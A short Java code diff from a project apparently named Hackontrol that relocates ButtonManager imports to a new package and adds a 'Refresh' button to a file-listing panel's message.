@@ -4,9 +4,9 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
-import com.khopan.hackontrol.manager.interaction.ButtonManager;
-import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.registry.Registration;
+import com.khopan.hackontrol.service.interaction.ButtonManager;
+import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.utils.LargeMessage;
 import com.khopan.hackontrol.utils.interaction.HackontrolButton;
 import com.khopan.hackontrol.widget.ControlWidget;
@@ -107,8 +107,14 @@ public class FilePanel extends Panel {
 			builder.append('`');
 		}
 
+		File finalFolder = folder;
 		LargeMessage.send(builder.toString(), callback, (request, identifiers) -> {
 			List<ItemComponent> list = new ArrayList<>();
+			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Refresh", context -> {
+				this.sendFileList(finalFolder, context);
+				HackontrolButton.deleteMessages(context);
+			}));
+
 			list.add(HackontrolButton.delete(identifiers));
 			request.addActionRow(list);
 		});
